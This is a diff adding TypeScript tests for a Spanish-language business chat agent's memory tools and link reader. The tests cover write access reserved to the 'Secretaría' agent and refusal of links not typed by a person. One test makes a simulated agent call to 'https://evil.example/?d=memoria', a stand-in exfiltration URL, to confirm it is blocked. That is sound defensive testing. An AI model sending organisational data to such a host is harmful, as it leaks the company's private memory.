@@ -8,6 +8,9 @@ import type { AskRecord, AskStore } from '../src/accountAsks';
 import type { AsPerson } from '../src/settings';
 import { type GuidedStore, guidedToolsFor } from '../src/guidedAccounts';
 import { type AgentTools, NO_TOOLS } from '../src/tools';
+import type { MemoryDeps } from '../src/memory';
+import type { RecordRepo } from '../src/recordSync';
+import { linkTools } from '../src/links';
 import { fakeSupabase } from './fixtures/fakeSupabase';
 import { guidedSecretName, MemoryVault } from '../src/vault';
 
@@ -56,6 +59,8 @@ function setup(
     decisions?: DecisionOpener;
     /** What the agent already summarised of the thread. */
     summary?: ConversationSummary;
+    memory?: MemoryDeps;
+    links?: AgentTools;
   } = {},
 ) {
   const threadAgent = opts.agent ?? finanzas;
@@ -149,6 +154,8 @@ function setup(
       asks: opts.asks,
       guidedToolsFor: opts.guidedToolsFor,
       decisions: opts.decisions,
+      memory: opts.memory,
+      links: opts.links,
     },
     accounts: {} as never,
     actions: {} as never,
@@ -992,5 +999,57 @@ describe('guided tools that cannot be read', () => {
     });
     await call('ana', `/threads/${THREAD}/reply`);
     expect(updates.at(-1)).toMatchObject({ state: 'done', text: 'Vamos bien.' });
+  });
+});
+
+describe("the organisation's memory in the chat (business-brain.md)", () => {
+  const secretaria: ChatAgent = { id: AGENT, orgId: ORG, name: 'Secretaría', ghost: 'secretaria', department: 'direccion', isMain: true };
+  const repo = {} as RecordRepo;
+  const store = { memoryIndex: async () => [], memory: async () => null, searchMemory: async () => [], saveMemory: async () => {}, forgetMemory: async () => {} };
+  const memory = (reached: boolean): MemoryDeps => ({ store, repoFor: async () => (reached ? repo : null), memberName: async () => 'Ana' });
+  const toolNames = (asked: Array<{ system: string }>) => (asked[0] as unknown as { tools: AgentTools }).tools.specs.map((x) => x.name);
+
+  it('lets Secretaría read and file, and tells her how to file and cite', async () => {
+    const { call, asked } = setup({ agent: secretaria, memory: memory(true), links: linkTools() });
+    await call('ana', `/threads/${THREAD}/reply`);
+    expect(toolNames(asked)).toEqual(expect.arrayContaining(['memory_view', 'memory_search', 'memory_create', 'memory_str_replace', 'read_link']));
+    expect(asked[0]?.system).toContain('Tú guardas la memoria de la empresa');
+    expect(asked[0]?.system).toContain('(/memoria/proveedores/gestoria.md)');
+    expect(asked[0]?.system).toContain('todavía no puedes guardar cosas privadas');
+    expect(asked[0]?.system).not.toContain('acceso al registro');
+  });
+
+  it('lets any other agent only read it, and send what it learns to Secretaría', async () => {
+    const { call, asked } = setup({ memory: memory(true) });
+    await call('ana', `/threads/${THREAD}/reply`);
+    const names = toolNames(asked);
+    expect(names).toEqual(expect.arrayContaining(['memory_view', 'memory_search']));
+    expect(names).not.toContain('memory_create');
+    expect(asked[0]?.system).toContain('Solo Secretaría escribe en la memoria de la empresa');
+  });
+
+  it('reads a link a person pasted, never one that came from somewhere else', async () => {
+    const outcomes: unknown[] = [];
+    const page = (async () => new Response('<title>Acme</title>', { headers: { 'content-type': 'text/html' } })) as unknown as typeof fetch;
+    const { call } = setup({
+      messages: [msg({ text: 'Guarda esto: https://acme.example/precios' })],
+      links: linkTools(page),
+      write: async ({ tools: t, onText }) => {
+        outcomes.push(await t.run('read_link', { url: 'https://acme.example/precios' }));
+        outcomes.push(await t.run('read_link', { url: 'https://evil.example/?d=memoria' }));
+        onText('Hecho.');
+      },
+    });
+    await call('ana', `/threads/${THREAD}/reply`);
+    expect(outcomes[0]).toMatchObject({ isError: false });
+    expect(outcomes[1]).toEqual({ content: expect.stringContaining('Solo leo enlaces que una persona ha escrito'), isError: true });
+  });
+
+  it('gives no memory to an organisation without a record in our store', async () => {
+    const { call, asked } = setup({ agent: secretaria, memory: memory(false) });
+    await call('ana', `/threads/${THREAD}/reply`);
+    expect(toolNames(asked)).not.toContain('memory_view');
+    expect(asked[0]?.system).toContain('acceso al registro');
+    expect(asked[0]?.system).not.toContain('memoria de la empresa');
   });
 });
